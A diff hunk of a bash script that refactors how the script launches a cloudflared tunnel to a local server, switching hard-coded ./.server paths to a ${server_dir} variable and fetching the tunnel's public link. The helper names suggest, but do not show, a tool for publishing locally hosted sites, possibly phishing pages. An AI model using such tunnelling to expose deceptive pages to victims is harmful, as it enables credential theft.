@@ -552,13 +552,14 @@ install_cloudflared() {
 ## Start Cloudflared
 start_cloudflared() {
         setup_site_check
+	rm ${server_dir}/.cld.log > /dev/null 2>&1 &
         rm .cld.log > /dev/null 2>&1 &
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
         if [[ `command -v termux-chroot` ]]; then
-                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+                sleep 2 && termux-chroot ${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
         else
-                sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+                sleep 2 && ${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
         fi
 	sleep 15
 	fetchlink_cloudflared
